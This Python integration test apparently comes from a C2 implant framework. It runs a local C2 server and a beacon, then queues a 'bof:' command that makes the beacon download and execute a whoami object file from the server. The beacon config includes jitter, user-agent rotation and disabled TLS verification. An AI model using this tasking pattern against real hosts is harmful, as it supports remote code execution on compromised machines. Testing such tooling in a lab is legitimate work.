#!/usr/bin/env python3
"""
End-to-end integration test: C2 Server + Beacon + BOF execution.

This test:
1. Starts the C2 server in a background thread
2. Runs the beacon as a subprocess
3. Injects a BOF command via the C2 REPL
4. Waits for the beacon to execute the BOF and report results
5. Verifies the BOF output matches expected
6. Cleans up beacon and C2 server
"""

import os
import json
import time
import subprocess
import threading
import select
import socket
import tempfile
import shutil
from pathlib import Path
import sys

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "c2"))
sys.path.insert(0, str(ROOT / "include"))

from c2.server import C2State, serve, load_runtime_config
from include.config_py import load_config


class TestC2BeaconBOFIntegration:
	"""Full integration test: C2 Server + Beacon + BOF."""

	def setup_method(self):
		"""Create temporary directories and config."""
		self.temp_dir = Path(tempfile.mkdtemp(prefix="bsb_e2e_"))
		self.log_dir = self.temp_dir / "logs"
		self.upload_dir = self.temp_dir / "uploads"
		self.log_dir.mkdir()
		self.upload_dir.mkdir()

		# Generate a master key for this test
		self.master_key = bytes.fromhex("a" * 64)
		from cryptography.hazmat.primitives import hashes
		from cryptography.hazmat.primitives.kdf.hkdf import HKDF
		from cryptography.hazmat.backends import default_backend
		
		hkdf_enc = HKDF(hashes.SHA256(), 32, b"blacksandbeacon-v2", b"enc", default_backend())
		hkdf_hmac = HKDF(hashes.SHA256(), 32, b"blacksandbeacon-v2", b"hmac", default_backend())
		self.enc_key = hkdf_enc.derive(self.master_key)
		self.hmac_key = hkdf_hmac.derive(self.master_key)

		# Config for C2 server
		self.cfg = {
			"host": "127.0.0.1",
			"port": 0,
			"uri": "/api/poll/",
			"report_uri": "/report/",
			"encryption_key": self.enc_key,
			"hmac_key": self.hmac_key,
			"hmac_enabled": True,
			"hmac_key_bytes": self.hmac_key,
			"log_dir": str(self.log_dir),
			"upload_dir": str(self.upload_dir),
			"max_workers": 5,
		}

	def teardown_method(self):
		"""Clean up temporary files."""
		if self.temp_dir.exists():
			shutil.rmtree(self.temp_dir)

	def _free_port(self):
		"""Get a free port."""
		s = socket.socket()
		s.bind(("127.0.0.1", 0))
		port = s.getsockname()[1]
		s.close()
		return port

	def _wait_for_server_ready(self, host, port, timeout=5):
		"""Wait for server to accept connections."""
		start = time.time()
		while time.time() - start < timeout:
			try:
				s = socket.socket()
				s.settimeout(1)
				s.connect((host, port))
				s.close()
				return True
			except (ConnectionRefusedError, socket.timeout):
				time.sleep(0.1)
		return False

	def _wait_for_bof_result(self, state, client_id, timeout=15):
		"""Poll for BOF result in logs."""
		start = time.time()
		log_file = Path(state.cfg["log_dir"]) / f"{client_id}.log"
		print(f"Waiting for BOF result in {log_file}...")
		
		while time.time() - start < timeout:
			if log_file.exists():
				content = log_file.read_text()
				print(f"Log content: {content[:200]}...")
				if "whoami" in content or "uid=" in content:
					lines = content.strip().split('\n')
					if len(lines) > 1:
						parts = lines[-1].split(',')
						if len(parts) >= 12:
							return parts[11]
			time.sleep(0.5)
		print("Timeout waiting for BOF result")
		return None

	def test_beacon_executes_whoami_bof(self):
		"""Test: Beacon executes whoami BOF and returns output."""
		
		# 1. Build beacon if needed
		beacon_path = ROOT / "build" / "beacon"
		if not beacon_path.exists():
			result = subprocess.run(["make", "beacon"], cwd=ROOT, capture_output=True, text=True)
			assert result.returncode == 0, f"Build failed: {result.stderr}"
		
		# 2. Copy whoami BOF to upload directory
		whoami_bof = ROOT / "build" / "bof" / "whoami.x64.o"
		assert whoami_bof.exists(), "whoami BOF not built"
		shutil.copy(whoami_bof, self.upload_dir / "whoami.x64.o")
		
		# 3. Write config.json for beacon
		port = self._free_port()
		config = {
			"c2": {
				"url": f"http://127.0.0.1:{port}",
				"uri": "/api/poll/",
				"client_id": "test_beacon",
				"report_uri": "/report/",
				"port": port,
			},
			"crypto": {
				"master_key_hex": "a" * 64,
				"mode": "cfb",
			},
			"timing": {
				"sleep_seconds": 1,
				"jitter_percent": 0,
				"curl_timeout_seconds": 5,
				"curl_connect_timeout_seconds": 2,
			},
			"network": {
				"user_agents": ["test-agent"],
				"verify_tls": False,
				"cert_fingerprint_sha256": "",
			},
			"bof": {
				"download_chunk_size": 4096,
				"output_buffer_size": 65536,
			},
			"backoff": {
				"base_seconds": 1,
				"max_seconds": 10,
			},
		}
		config_path = self.temp_dir / "config.json"
		
		# Write and verify config file
		config_path.write_text(json.dumps(config))
		with open(config_path) as f:
			raw_json = json.load(f)
		print(f"Written config c2.port: {raw_json.get('c2', {}).get('port', 'NOT SET')}")
		print(f"Written config c2.url: {raw_json.get('c2', {}).get('url', 'NOT SET')}")
		
		# Debug: check what load_config returns
		from include.config_py import load_config
		raw_data = load_config(config_path)
		print(f"load_config c2.port: {raw_data.get('c2', {}).get('port', 'NOT SET')}")
		print(f"load_config c2.url: {raw_data.get('c2', {}).get('url', 'NOT SET')}")
		
		# Load runtime config for server
		os.environ["BSB_CONFIG"] = str(config_path)
		self.cfg = load_runtime_config()
		print(f"Loaded config URL: {self.cfg.get('url', 'NOT SET')}")
		print(f"Loaded config port: {self.cfg.get('port', 'NOT SET')}")
		print(f"Loaded config encryption_key: {'SET' if self.cfg.get('encryption_key') else 'NOT SET'}")
		print(f"Loaded config aes_key: {'SET' if self.cfg.get('aes_key') else 'NOT SET'}")
		
		state = C2State(self.cfg)
		server_thread = threading.Thread(
			target=self._run_server,
			args=(self.cfg, state),
			daemon=True
		)
		server_thread.start()
		
		# Wait for server to be ready
		assert self._wait_for_server_ready("127.0.0.1", self.cfg["port"]), "Server didn't start"
		time.sleep(0.5)
		
		try:
			# Copy BOF to upload directory
			shutil.copy(ROOT / "build" / "bof" / "whoami.x64.o", self.upload_dir / "whoami.x64.o")
			
			# Queue BOF command
			bof_url = f"http://127.0.0.1:{self.cfg['port']}/bof/whoami.x64.o"
			bof_command = f"bof:{bof_url}"
			with state.lock:
				state.commands["test_beacon"] = bof_command
			print(f"Queued: {bof_command}")
			
			# Start beacon
			beacon_path = ROOT / "build" / "beacon"
			env = os.environ.copy()
			env["BSB_CONFIG"] = str(config_path)
			beacon_proc = subprocess.Popen(
				[str(beacon_path)],
				cwd=str(self.temp_dir),
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				text=True,
				env=env
			)
			
			# Wait for beacon to start and poll
			time.sleep(3)
			
			# Check beacon output
			ready, _, _ = select.select([beacon_proc.stdout, beacon_proc.stderr], [], [], 3)
			for stream in ready:
				line = stream.readline()
				if stream == beacon_proc.stdout:
					print(f"Beacon stdout: {line.strip()}")
				else:
					print(f"Beacon stderr: {line.strip()}")
			
			# Wait for BOF result
			print("Waiting for BOF result...")
			result = self._wait_for_bof_result(state, "test_beacon", timeout=30)
			
			if result is None:
				# Debug output
				for stream in [beacon_proc.stdout, beacon_proc.stderr]:
					ready, _, _ = select.select([stream], [], [], 1)
					if ready:
						line = stream.readline()
						if line:
							prefix = 'stdout' if stream == beacon_proc.stdout else 'stderr'
							print(f"Beacon {prefix}: {line.strip()}")
				
				print(f"Server commands: {state.commands}")
				print(f"Server results: {list(state.results.keys())}")
				print(f"Connected clients: {state.connected_clients}")
				log_file = Path(state.cfg["log_dir"]) / "test_beacon.log"
				if log_file.exists():
					content = log_file.read_text()
					print(f"Log file content: {content[:500]}")
			
			assert result is not None, "No BOF result received"
			assert "uid=" in result, f"Expected uid in output, got: {result}"
			print(f"✓ BOF output verified: {result.strip()}")
			
			# Cleanup
			beacon_proc.terminate()
			try:
				beacon_proc.wait(timeout=3)
			except subprocess.TimeoutExpired:
				beacon_proc.kill()
				beacon_proc.wait()
		finally:
			pass

	def _run_server(self, cfg, state):
		serve(cfg, state)

	def _wait_for_server_ready(self, host, port, timeout=5):
		start = time.time()
		while time.time() - start < timeout:
			try:
				s = socket.socket()
				s.settimeout(1)
				s.connect((host, port))
				s.close()
				return True
			except (ConnectionRefusedError, socket.timeout):
				time.sleep(0.1)
		return False


def test_c2_beacon_bof_integration():
	"""Pytest entry point."""
	test = TestC2BeaconBOFIntegration()
	test.setup_method()
	try:
		test.test_beacon_executes_whoami_bof()
		print("✅ Full integration test PASSED")
	finally:
		test.teardown_method()


if __name__ == "__main__":
	test_c2_beacon_bof_integration()